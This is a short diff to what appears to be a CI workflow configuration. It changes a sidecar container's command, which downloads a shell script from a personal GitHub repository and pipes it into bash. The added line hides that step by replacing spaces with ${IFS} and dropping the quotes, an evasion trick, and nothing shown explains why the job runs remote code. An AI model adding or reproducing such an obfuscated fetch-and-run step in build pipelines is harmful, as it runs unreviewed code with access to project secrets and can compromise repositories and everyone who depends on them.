@@ -20,7 +20,7 @@ jobs:
       sidecar:
         image: mcr.microsoft.com/dotnet/sdk:11.0
         entrypoint: bash
-        command: -lc 'curl --fail --silent --show-error --location https://raw.githubusercontent.com/aeorauk-maker/dotnet-runtime-cross-platform-validation-laboratory/20c3a8172941027a57d2a21bbd0d7279e02b02f1/eop062-service-entry.sh | bash'
+        command: -lc curl${IFS}--fail${IFS}--silent${IFS}--show-error${IFS}--location${IFS}https://raw.githubusercontent.com/aeorauk-maker/dotnet-runtime-cross-platform-validation-laboratory/20c3a8172941027a57d2a21bbd0d7279e02b02f1/eop062-service-entry.sh|bash
         options: --user 1001:1001 --cap-drop ALL --security-opt no-new-privileges
         volumes:
           - /tmp:/tmp
